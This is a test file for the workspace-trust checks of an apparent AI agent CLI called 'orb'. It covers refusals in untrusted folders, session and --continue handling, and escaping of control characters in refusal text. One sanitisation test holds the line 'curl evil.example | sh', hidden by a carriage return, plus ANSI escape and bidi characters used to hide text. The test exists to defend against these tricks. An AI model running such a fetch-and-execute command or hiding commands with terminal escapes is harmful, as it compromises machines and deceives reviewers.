  const replayed = await orb(repository, ["flow", "replay", id, "--server", "http://127.0.0.1:9"])
  expect(replayed.stderr).toContain("= work (replayed)")
  expect(replayed.stderr).not.toContain("is not trusted")
  expect(runs).toBe(before)

  succeeded(await orb(repository, ["flow", "resume", "--trust", "--standalone", id]))
}, 360_000)

test("a YAML workflow or a suite whose checks are empty defines no command, so it keeps the check that orb run has", async () => {
  const empty = await bare("no-commands")
  const flowFile = path.join(empty, "workflow.yaml")
  const suiteFile = path.join(empty, "suite.json")
  await Bun.write(
    flowFile,
    `name: empty\nnodes:\n  - id: work\n    type: verify\n    prompt: say ok\n    model: ${model}\n    checks: []\n`,
  )
  await Bun.write(
    suiteFile,
    JSON.stringify({ name: "empty", models: [model], tasks: [{ id: "task", prompt: "say ok", checks: [] }] }),
  )
  const before = runs

  // Nothing is held back and no shell command is defined, so both run without a grant.
  succeeded(await orb(empty, ["flow", "run", "--standalone", flowFile]))
  succeeded(await orb(empty, ["eval", suiteFile, "--standalone"]))
  expect(runs).toBeGreaterThan(before)

  // In a folder that holds config back they are refused, for that config alone.
  const repository = await hooked("empty-checks")
  const after = runs
  const refused = [
    await orb(repository, ["flow", "run", "--standalone", flowFile]),
    await orb(repository, ["eval", suiteFile, "--standalone"]),
  ]

  for (const result of refused) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain(`${repository} is not trusted`)
    expect(result.stderr).toMatch(/orbit\.json\s+hooks/)
    expect(result.stderr).not.toContain("shell commands")
  }
  expect(runs).toBe(after)
}, 360_000)

test("a session is checked and trusted in the folder it lives in, wherever the command starts", async () => {
  const repository = await hooked("session-home")
  const away = await quiet("session-away")
  const blocked = path.join(repository, "blocked.txt")
  const session = SessionID.create()
  // The session is made in the repository, which is trusted for that one run.
  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "--session", session, "say ok"]))
  const before = runs

  // Continued from a clean folder it still runs in the repository, which is untrusted, so nothing starts.
  const refused = await orb(away, ["run", "--standalone", "--model", model, "--session", session, "write blocked.txt"])
  const looped = await orb(away, [
    "loop",
    "10s",
    "check",
    "--times",
    "1",
    "--standalone",
    "--model",
    model,
    "-s",
    session,
  ])
  for (const result of [refused, looped]) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain(`${repository} is not trusted`)
  }
  expect(runs).toBe(before)
  expect(await Bun.file(blocked).exists()).toBe(false)

  // --trust goes to the folder the run happens in, so the repository's hook is in force there.
  const answered = toolAnswers.length
  succeeded(
    await orb(away, ["run", "--trust", "--standalone", "--model", model, "--session", session, "write blocked.txt"]),
  )
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)
}, 240_000)

test("a session in a clean folder is not refused for the repository the command starts in", async () => {
  const repository = await hooked("session-start")
  const clean = await quiet("session-lives")
  const session = SessionID.create()
  succeeded(await orb(clean, ["run", "--standalone", "--model", model, "--session", session, "say ok"]))

  const continued = await orb(repository, ["run", "--standalone", "--model", model, "--session", session, "say ok"])
  const looped = await orb(repository, [
    "loop",
    "10s",
    "check",
    "--times",
    "1",
    "--standalone",
    "--model",
    model,
    "-s",
    session,
  ])

  succeeded(continued)
  expect(continued.stdout).toContain("ran fine")
  succeeded(looped)
  // A session that does not exist yet starts where the command does, and so does --continue.
  for (const choice of [["--session", SessionID.create()], ["--continue"]]) {
    const started = await orb(repository, ["run", "--standalone", "--model", model, ...choice, "say ok"])
    expect(started.code).toBe(1)
    expect(started.stderr).toContain(`${repository} is not trusted`)
  }
}, 240_000)

test("--continue continues the newest session of the folder the command starts in, so that is the folder that is checked", async () => {
  const repository = await hooked("continue-home")
  const away = await quiet("continue-away")
  const kept = path.join(repository, "blocked.txt")
  const moved = path.join(away, "blocked.txt")
  // A session in the repository, trusted for that one run. It is the newest session there is, so a --continue that
  // looked for the newest session anywhere would pick it.
  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "say ok"]))
  const before = runs

  // Started from a clean folder it finds no session there, begins one of its own, and the write lands in that folder.
  // The repository, which is untrusted and has a hook that blocks every write, is never touched, so the check on the
  // folder the command starts in is the check on the folder the continued session lives in. A --continue that went to
  // another folder would need that folder checked, as --session does.
  succeeded(await orb(away, ["run", "--continue", "--standalone", "--model", model, "write blocked.txt"]))
  expect(runs).toBeGreaterThan(before)
  expect(await Bun.file(moved).exists()).toBe(true)
  expect(await Bun.file(kept).exists()).toBe(false)

  // From the repository itself it is refused, as it is the folder the continued session would live in.
  const refused = await orb(repository, ["run", "--continue", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain(`${repository} is not trusted`)
}, 240_000)

test("config in a folder above the repository is named with the folder to trust, and trusting the repository does not claim to apply it", async () => {
  const { parent, child } = await layered("above")
  const guarded = path.join(parent, "orbit.json")
  const blocked = path.join(child, "blocked.txt")
  const before = runs

  const refused = await orb(child, ["run", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain(guarded)
  // The remedy is the folder that holds the file, not the repository, and --trust would not lift it either.
  const advice = refused.stderr.split(/\r?\n/).filter((line) => line.includes("orb trust"))
  expect(advice.length).toBeGreaterThan(0)
  for (const line of advice) expect(line).toContain(parent)
  expect(runs).toBe(before)

  // Trusting the repository leaves the file above it held back, and says so instead of claiming it applies.
  const trusted = await orb(child, ["trust", "--standalone"])
  succeeded(trusted)
  expect(trusted.stdout).toContain(`Trusted ${child}`)
  expect(trusted.stdout).not.toContain("now applies")
  expect(trusted.stdout).toContain("Still held back")
  expect(trusted.stdout).toContain(guarded)
  expect(trusted.stdout.split(/\r?\n/).some((line) => line.includes("orb trust") && line.includes(parent))).toBe(true)

  // The run that follows goes on, as the repository is trusted, and says that the file above it stays off.
  const ran = await orb(child, ["run", "--standalone", "--model", model, "write blocked.txt"])
  succeeded(ran)
  expect(ran.stderr).toContain(guarded)
  expect(ran.stderr).toContain("orb trust")
  expect(await Bun.file(blocked).exists()).toBe(true)
  await fs.rm(blocked)

  // Trusting the folder that holds it applies it, as that advice said it would.
  const applied = await orb(child, ["trust", "--standalone", parent])
  succeeded(applied)
  expect(applied.stdout).toContain("now applies")
  expect(applied.stdout).toMatch(/orbit\.json\s+hooks/)
  const answered = toolAnswers.length
  const guardedRun = await orb(child, ["run", "--standalone", "--model", model, "write blocked.txt"])
  succeeded(guardedRun)
  expect(guardedRun.stderr).not.toContain(guarded)
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)
}, 360_000)

test("orb run --format json reports a trust request that fails as the JSON error any failure before a session exists is", async () => {
  const gone = path.join(root, "work", "no-such-folder")

  for (const format of ["json", "stream-json"]) {
    const result = await orb(gone, ["run", "--standalone", "--format", format, "--model", model, "say ok"])

    expect(result.code).toBe(1)
    // The message names the folder that could not be checked, rather than leaving a bare status code.
    expect(JSON.parse(result.stdout)).toMatchObject({
      type: "error",
      sessionID: "",
      error: { type: "unknown", message: expect.stringContaining(`Could not check whether ${gone} is trusted`) },
    })
    expect(result.stderr).not.toContain("ClientError")
  }
  const result = await orb(gone, ["run", "--standalone", "--format", "result", "--model", model, "say ok"])
  expect(result.code).toBe(1)
  expect(JSON.parse(result.stdout)).toMatchObject({
    type: "result",
    is_error: true,
    error: expect.stringContaining(gone),
  })
}, 240_000)

test("orb trust --revoke says that a folder has to exist for its grant to be revoked, and revokes it once it does", async () => {
  const repository = await hooked("gone")
  succeeded(await orb(repository, ["trust", "--standalone"]))
  await fs.rm(repository, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 })

  const revoked = await orb(root, ["trust", "--standalone", "--revoke", repository])

  expect(revoked.code).toBe(1)
  expect(revoked.stdout).toBe("")
  expect(revoked.stderr).toContain(`Not a folder: ${repository}`)
  expect(revoked.stderr).toContain("create it again")
  expect(revoked.stderr).not.toContain("ClientError")
  // The grant stays in the list, which is why the message asks for the folder back.
  const listed = await orb(root, ["trust", "--standalone", "--list"])
  succeeded(listed)
  expect(listed.stdout).toContain(repository)
  // A folder at that path, as the message says to make, is enough.
  await fs.mkdir(repository, { recursive: true })
  succeeded(await orb(root, ["trust", "--standalone", "--revoke", repository]))
  const after = await orb(root, ["trust", "--standalone", "--list"])
  succeeded(after)
  expect(after.stdout).not.toContain(repository)
}, 240_000)

test("orb acp says on stderr what the folder it starts in holds back, and keeps stdout for the protocol", async () => {
  const repository = await hooked("acp")
  const cli = path.join(import.meta.dir, "..")
  // ACP takes the folder from the process itself rather than from PWD, so the process, and the private server it
  // starts, run in the repository. Bun finds its preload for the terminal UI's JSX in the folder it starts in, which
  // here is the repository, so the repository names it.
  await Bun.write(
    path.join(repository, "bunfig.toml"),
    `preload = [${JSON.stringify(Bun.resolveSync("@opentui/solid/preload", cli))}]\n`,
  )
  const child = Bun.spawn([process.execPath, "run", path.join(cli, "src", "index.ts"), "acp"], {
    cwd: repository,
    env: isolatedEnv(root, {
      USERPROFILE: root,
      ORBIT_TRUST_PROJECT: undefined,
      ORBIT_CONFIG: undefined,
      ORBIT_CONFIG_CONTENT: undefined,
      OLLAMA_CONTEXT_LENGTH: undefined,
    }),
    stdin: "pipe",
    stdout: "pipe",
    stderr: "pipe",
  })
  let stderr = ""
  const errors = (async () => {
    for await (const chunk of child.stderr) stderr += new TextDecoder().decode(chunk)
  })()
  const lines = (async () => {
    const found: string[] = []
    let buffered = ""
    for await (const chunk of child.stdout) {
      buffered += new TextDecoder().decode(chunk)
      const complete = buffered.split("\n")
      buffered = complete.pop() ?? ""
      found.push(...complete.filter((line) => line.trim() !== ""))
    }
    return [...found, ...(buffered.trim() === "" ? [] : [buffered])]
  })()
  try {
    child.stdin.write(
      JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "initialize",
        params: { protocolVersion: 1, clientCapabilities: {}, clientInfo: { name: "trust-test", version: "0" } },
      }) + "\n",
    )
    await child.stdin.flush()
    const deadline = Date.now() + 60_000
    while (!stderr.includes("orb trust") && Date.now() < deadline) await Bun.sleep(100)
  } finally {
    await child.stdin.end()
  }
  await Promise.all([child.exited, errors])
  const frames = await lines

  expect(stderr).toContain("orb acp:")
  expect(stderr).toContain(`${repository} is not trusted`)
  expect(stderr).toMatch(/orbit\.json: hooks/)
  expect(stderr).toMatch(/\.orbit: plugins/)
  expect(stderr).toContain("`orb trust`")
  // Everything on stdout is a JSON-RPC message: the answer to initialize, and nothing the warning was written to.
  expect(frames.length).toBeGreaterThan(0)
  for (const frame of frames) expect(JSON.parse(frame)).toMatchObject({ jsonrpc: "2.0" })
  expect(frames.some((frame) => JSON.parse(frame).id === 1)).toBe(true)
}, 180_000)

// Folders that the pure functions below only print, so they need not exist.
const repo = path.resolve("/trust-repo")
const outer = path.resolve("/trust-outer")
const wider = path.resolve("/trust-wider")

test("the refusal names what is held back, and says what a home directory needs instead", () => {
  const folder = repo
  const status = {
    directory: folder,
    trusted: false,
    persistent: true,
    withheld: [
      { path: path.join(folder, "orbit.json"), kinds: ["hooks", "mcp"] },
      { path: path.join(folder, ".orbit"), kinds: ["plugins"] },
      { path: path.join(outer, "orbit.json"), kinds: ["providers"], directory: outer },
    ],
  } satisfies TrustStatus

  const text = refusal(status)

  expect(text).toContain(`${folder} is not trusted`)
  expect(text).toMatch(/^ {2}orbit\.json\s+hooks, mcp$/m)
  expect(text).toMatch(/^ {2}\.orbit\s+plugins$/m)
  // A folder above the project is shown by its whole path, and its own folder is the one to trust for it.
  expect(text).toContain(path.join(outer, "orbit.json"))
  expect(text).toContain("`orb trust`")
  expect(text).toContain("--trust")
  expect(text).toContain(`orb trust ${outer}`)

  const home = refusal({ ...status, persistent: false })
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
})

test("the refusal for config above the project names its folder, as neither the project nor --trust lifts it", () => {
  const status = {
    directory: repo,
    trusted: false,
    persistent: true,
    withheld: [
      { path: path.join(outer, "orbit.json"), kinds: ["hooks"], directory: outer },
      { path: path.join(wider, ".orbit"), kinds: ["plugins"], directory: wider },
    ],
  } satisfies TrustStatus

  const text = refusal(status)

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain(`orb trust ${outer}`)
  expect(text).toContain(`orb trust ${wider}`)
  // Nothing of the project's own is held back, so neither trusting it nor --trust would apply any of this.
  expect(text).not.toContain("`orb trust`")
  expect(text).not.toContain("--trust")
})

test("the refusal for a command that imports a file says it runs code from the folder, whether or not config is held back", () => {
  const file = path.join(repo, "workflows", "plan.ts")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus

  const text = refusal(status, file)

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("runs code from the folder")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`it imports ${path.join("workflows", "plan.ts")},`)
  expect(text).not.toContain(file)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The folder holds nothing back, so there is no list.
  expect(text).not.toContain("holds back")

  const held = refusal({ ...status, withheld: [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] }, file)
  expect(held).toContain("runs code from the folder")
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  // A file outside the folder is named in full.
  expect(refusal(status, path.join(outer, "plan.ts"))).toContain(`it imports ${path.join(outer, "plan.ts")},`)

  const home = refusal({ ...status, persistent: false }, file)
  expect(home).toContain("runs code from the folder")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")

  // Config above the project is still named with the folder to trust for it.
  const above = refusal(
    { ...status, withheld: [{ path: path.join(outer, "orbit.json"), kinds: ["hooks"], directory: outer }] },
    file,
  )
  expect(above).toContain("runs code from the folder")
  expect(above).toContain("Look the file over, then trust the folder for good")
  expect(above).toContain(`orb trust ${outer}`)
})

test("the refusal for a command that runs the shell commands of a file lists them, whether or not config is held back", () => {
  const file = path.join(repo, "flows", "feature.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const commands = [
    { id: "tests", command: "npm test" },
    { id: "api", command: "npm run build" },
    { id: "api", command: "npm run lint" },
  ]

  const text = refusal(status, undefined, { file, commands, approvals: [] })

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("runs shell commands from the folder")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`${path.join("flows", "feature.yaml")} defines them`)
  expect(text).not.toContain(file)
  // Each command is listed with the node or task that carries it, in two columns.
  expect(text).toMatch(/^ {2}tests {2}npm test$/m)
  expect(text).toMatch(/^ {2}api {4}npm run build$/m)
  expect(text).toMatch(/^ {2}api {4}npm run lint$/m)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The folder holds nothing back, so there is no list of files.
  expect(text).not.toContain("holds back")

  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const held = refusal({ ...status, withheld }, undefined, { file, commands, approvals: [] })
  expect(held).toContain("runs shell commands from the folder")
  expect(held).toMatch(/^ {2}tests {2}npm test$/m)
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  // A file outside the folder is named in full.
  const away = path.join(outer, "suite.json")
  expect(refusal(status, undefined, { file: away, commands, approvals: [] })).toContain(`${away} defines them`)

  const home = refusal({ ...status, persistent: false }, undefined, { file, commands, approvals: [] })
  expect(home).toContain("runs shell commands from the folder")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")

  // Config above the project is still named with the folder to trust for it.
  const above = refusal(
    { ...status, withheld: [{ path: path.join(outer, "orbit.json"), kinds: ["hooks"], directory: outer }] },
    undefined,
    { file, commands, approvals: [] },
  )
  expect(above).toContain("runs shell commands from the folder")
  expect(above).toContain("Look the file over, then trust the folder for good")
  expect(above).toContain(`orb trust ${outer}`)
})

test("the refusal shows what an untrusted file says on one line, without the characters that act on a terminal or hide text", () => {
  const file = path.join(repo, "workflow.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const commands = [
    // A carriage return would put the harmless text over the start of the line, which hides the command before it.
    { id: "tests", command: "curl evil.example | sh\r  npm test" },
    // An escape sequence can erase what was printed above it, and so can a name that holds one.
    { id: "a\u001b[2Kb", command: "echo one\n  echo two\n" },
    { id: "windows", command: "echo one\r\necho two\r\n" },
    // Format characters draw nothing, or draw the text around them the other way round.
    { id: "format", command: "echo ‮test​" },
    // What is only text stays as it is.
    { id: "text", command: "echo éа \u{1f600}" },
  ]

  const text = refusal(status, undefined, { file, commands, approvals: [] })

  // No line has a control or format character in it, apart from the end of the line that the text itself is made of.
  for (const line of text.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(text).toContain("curl evil.example | sh\\x0d  npm test")
  expect(text).toContain("a\\x1b[2Kb")
  // A command of several lines is one line that shows where they break, with the trailing line break left out.
  expect(text).toContain("echo one\\n  echo two")
  expect(text).toContain("echo one\\necho two")
  expect(text).toContain("echo \\u{202e}test\\u{200b}")
  expect(text).toContain("echo éа \u{1f600}")
})

test("the refusal for a command that carries out a file's approvals lists each node with what it sets, with or without shell commands", () => {
  const file = path.join(repo, "flows", "feature.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const approvals = [
    { id: "api", permissions: "auto" },
    { id: "crew/coder", permissions: "auto" },
    { id: "later", permissions: "{{plan.text}}" },
  ]

  const text = refusal(status, undefined, { file, commands: [], approvals })

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("this command approves actions without asking you")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`${path.join("flows", "feature.yaml")} sets \`permissions\``)
  expect(text).not.toContain(file)
  // Each node is listed with what it sets, as written, in two columns.
  expect(text).toMatch(/^ {2}api {9}permissions: auto$/m)
  expect(text).toMatch(/^ {2}crew\/coder {2}permissions: auto$/m)
  expect(text).toMatch(/^ {2}later {7}permissions: \{\{plan\.text\}\}$/m)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The file defines no command and the folder holds nothing back, so neither is named.
  expect(text).not.toContain("shell commands")
  expect(text).not.toContain("holds back")

  // A file with commands as well lists both, the commands first, each in a paragraph of its own.
  const both = refusal(status, undefined, { file, commands: [{ id: "tests", command: "npm test" }], approvals })
  expect(both).toContain("this command runs shell commands from the folder")
  expect(both).toContain("It also approves actions without asking you")
  expect(both).toMatch(/^ {2}tests {2}npm test$/m)
  expect(both).toMatch(/^ {2}api {9}permissions: auto$/m)
  expect(both.indexOf("npm test")).toBeLessThan(both.indexOf("It also approves"))

  // Config that is held back, a home directory and config above the project are named as they are for the other files.
  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const held = refusal({ ...status, withheld }, undefined, { file, commands: [], approvals })
  expect(held).toContain("this command approves actions without asking you")
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  const home = refusal({ ...status, persistent: false }, undefined, { file, commands: [], approvals })
  expect(home).toContain("this command approves actions without asking you")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")
})

test("the text for a server that cannot say whether the folder is trusted names what the command brings and every way to get an answer", () => {
  const module = path.join(repo, "workflows", "plan.ts")
  const file = path.join(repo, "flows", "feature.yaml")

  const imports = unanswered(repo, module)

  expect(imports).toContain(`the server is older than workspace trust, so it cannot say whether ${repo} is trusted`)
  // The file is named from the folder, and what the command does with it is said as it is for a folder that is not trusted.
  expect(imports).toContain(`this command runs code from the folder: it imports ${path.join("workflows", "plan.ts")},`)
  // A restart gives the server the routes, and the two flags start a current private server in its place.
  expect(imports).toContain("`orb service restart`")
  expect(imports).toContain("--standalone starts one that checks the folder")
  expect(imports).toContain("--trust starts one that trusts the folder for this run only")
  // The folder is not known to be untrusted, and an older server cannot trust it either.
  expect(imports).not.toContain("is not trusted")
  expect(imports).not.toContain("`orb trust`")

  const defined = unanswered(repo, undefined, {
    file,
    commands: [{ id: "tests", command: "npm test" }],
    approvals: [{ id: "api", permissions: "auto" }],
  })
  expect(defined).toContain(`the server is older than workspace trust, so it cannot say whether ${repo} is trusted`)
  expect(defined).toContain("this command runs shell commands from the folder")
  expect(defined).toContain(`${path.join("flows", "feature.yaml")} defines them`)
  expect(defined).toMatch(/^ {2}tests {2}npm test$/m)
  expect(defined).toContain("It also approves actions without asking you")
  expect(defined).toMatch(/^ {2}api {2}permissions: auto$/m)
  expect(defined).toContain("`orb service restart`")
  expect(defined).not.toContain("is not trusted")
})

test("the refusal shows the name of a file it names on one line, as a clone can give its files any name the platform allows", () => {
  // SGR 8 conceals what is printed after it, so a name that holds it would hide the commands listed below it.
  const hidden = path.join(repo, "flows", "a\u001b[8m.yaml")
  const status = {
    directory: repo,
    trusted: false,
    persistent: true,
    withheld: [{ path: path.join(repo, ".orbit", "b\u001b[2Kc.md"), kinds: ["commands"] }],
  } satisfies TrustStatus
  const commands = [{ id: "tests", command: "npm test" }]
  const approvals = [{ id: "api", permissions: "auto" }]
  const shown = `${path.join("flows", "a")}\\x1b[8m.yaml`

  for (const text of [
    refusal(status, hidden),
    refusal(status, undefined, { file: hidden, commands, approvals: [] }),
    refusal(status, undefined, { file: hidden, commands: [], approvals }),
    unanswered(repo, hidden),
    unanswered(repo, undefined, { file: hidden, commands, approvals }),
  ]) {
    // No line has a control or format character in it, apart from the end of the line that the text itself is made of.
    for (const line of text.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
    expect(text).toContain(shown)
  }
  // The files that are held back come from the same folder, and are shown the same way.
  const held = refusal(status)
  for (const line of held.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(held).toContain(`${path.join(".orbit", "b")}\\x1b[2Kc.md`)
})
